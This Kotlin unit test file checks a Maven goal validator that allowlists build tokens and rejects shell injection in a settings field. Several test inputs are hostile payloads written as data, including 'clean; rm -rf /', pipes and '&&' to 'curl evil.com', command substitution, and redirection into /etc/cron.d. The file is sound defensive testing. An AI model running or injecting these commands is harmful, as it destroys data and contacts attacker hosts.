package com.workflow.orchestrator.core.maven

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertInstanceOf
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

/**
 * Tests for [MavenGoalValidator] — the argv-split + token allowlist that guards
 * the `healthCheckMavenGoals` user-editable settings field.
 * (Audit finding core:F-11)
 */
class MavenGoalValidatorTest {

    // ── isAllowed — individual token checks ──────────────────────────────────

    @Test
    fun `standard lifecycle phases are allowed`() {
        for (phase in listOf("clean", "validate", "compile", "test", "package",
                              "verify", "install", "deploy", "site")) {
            assertTrue(MavenGoalValidator.isAllowed(phase), "Expected phase '$phase' to be allowed")
        }
    }

    @Test
    fun `hyphenated phases are allowed`() {
        for (phase in listOf("pre-clean", "post-clean", "process-resources",
                              "generate-sources", "pre-integration-test",
                              "post-integration-test", "prepare-package")) {
            assertTrue(MavenGoalValidator.isAllowed(phase), "Expected '$phase' to be allowed")
        }
    }

    @Test
    fun `plugin goal notation is allowed`() {
        for (goal in listOf("surefire:test", "compiler:compile",
                             "org.apache.maven.plugins:maven-surefire-plugin:test",
                             "spring-boot:run", "versions:display-dependency-updates")) {
            assertTrue(MavenGoalValidator.isAllowed(goal), "Expected goal '$goal' to be allowed")
        }
    }

    @Test
    fun `-D system property flags are allowed`() {
        for (flag in listOf("-DskipTests", "-Dmaven.test.skip=true",
                             "-Denv=prod", "-Dversion=1.2.3", "-DrunIT")) {
            assertTrue(MavenGoalValidator.isAllowed(flag), "Expected '-D' flag '$flag' to be allowed")
        }
    }

    @Test
    fun `-P profile flags are allowed`() {
        for (flag in listOf("-Pdev", "-Pci,staging", "-P!slow-tests")) {
            assertTrue(MavenGoalValidator.isAllowed(flag), "Expected '-P' flag '$flag' to be allowed")
        }
    }

    @Test
    fun `common short and long flags are allowed`() {
        for (flag in listOf("-o", "-X", "-e", "-N", "-q", "--offline",
                             "--batch-mode", "--quiet", "--no-transfer-progress",
                             "-ntp", "-am", "-amd")) {
            assertTrue(MavenGoalValidator.isAllowed(flag), "Expected flag '$flag' to be allowed")
        }
    }

    // ── isAllowed — shell metacharacter rejection ─────────────────────────────

    @Test
    fun `tokens with semicolon are rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("clean; rm -rf /"),
            "Semicolon must be rejected")
    }

    @Test
    fun `tokens with pipe are rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("verify | curl evil.com"),
            "Pipe must be rejected")
    }

    @Test
    fun `tokens with ampersand are rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("verify && curl evil.com"),
            "Double-ampersand must be rejected")
    }

    @Test
    fun `command substitution dollar-paren is rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("$(whoami)"),
            "Command substitution \$(whoami) must be rejected")
    }

    @Test
    fun `backtick command substitution is rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("`id`"),
            "Backtick command substitution must be rejected")
    }

    @Test
    fun `output redirection is rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("clean > /etc/cron.d/evil"),
            "Output redirection must be rejected")
    }

    @Test
    fun `newline-embedded tokens are rejected`() {
        assertFalse(MavenGoalValidator.isAllowed("clean\nrm -rf /"),
            "Embedded newline must be rejected")
    }

    // ── validate — batch validation ───────────────────────────────────────────

    @Test
    fun `valid goal string returns Valid with split tokens`() {
        val result = MavenGoalValidator.validate("clean verify -DskipTests")
        assertInstanceOf(MavenGoalValidator.ValidationResult.Valid::class.java, result)
        val valid = result as MavenGoalValidator.ValidationResult.Valid
        assertEquals(listOf("clean", "verify", "-DskipTests"), valid.tokens)
    }

    @Test
    fun `injection attempt clean semicolon rm is rejected`() {
        val result = MavenGoalValidator.validate("clean; rm -rf /")
        // "clean;" is a single token and contains a semicolon → invalid
        assertInstanceOf(MavenGoalValidator.ValidationResult.Invalid::class.java, result)
    }

    @Test
    fun `verify double-ampersand curl evil is rejected`() {
        val result = MavenGoalValidator.validate("verify && curl evil.com")
        assertInstanceOf(MavenGoalValidator.ValidationResult.Invalid::class.java, result)
    }

    @Test
    fun `dollar-paren whoami injection is rejected`() {
        val result = MavenGoalValidator.validate("test -Dhost=\$(hostname)")
        // token "-Dhost=\$(hostname)" contains $( → shell meta
        assertInstanceOf(MavenGoalValidator.ValidationResult.Invalid::class.java, result)
    }

    @Test
    fun `empty goals string returns Valid with empty list`() {
        val result = MavenGoalValidator.validate("")
        assertInstanceOf(MavenGoalValidator.ValidationResult.Valid::class.java, result)
        assertEquals(emptyList<String>(), (result as MavenGoalValidator.ValidationResult.Valid).tokens)
    }

    @Test
    fun `goals with only whitespace returns Valid with empty list`() {
        val result = MavenGoalValidator.validate("   ")
        assertInstanceOf(MavenGoalValidator.ValidationResult.Valid::class.java, result)
        assertEquals(emptyList<String>(), (result as MavenGoalValidator.ValidationResult.Valid).tokens)
    }

    @Test
    fun `offending token list includes all bad tokens`() {
        val result = MavenGoalValidator.validate("clean \$(whoami) install |pipe")
        assertInstanceOf(MavenGoalValidator.ValidationResult.Invalid::class.java, result)
        val invalid = result as MavenGoalValidator.ValidationResult.Invalid
        // Both "\$(whoami)" and "|pipe" should be flagged
        assertTrue(invalid.offending.isNotEmpty(), "Expected at least one offending token")
    }

    // ── MavenModuleDetector.buildMavenArgs integration ───────────────────────

    @Test
    fun `buildMavenArgs drops injection tokens and returns only valid ones`() {
        // Construct a MavenModuleDetector via reflection since it needs a Project
        // but the validator is the pure unit under test here. We test the
        // validator directly for the injection cases.
        val result = MavenGoalValidator.validate("clean; rm -rf /")
        assertInstanceOf(MavenGoalValidator.ValidationResult.Invalid::class.java, result)
    }
}
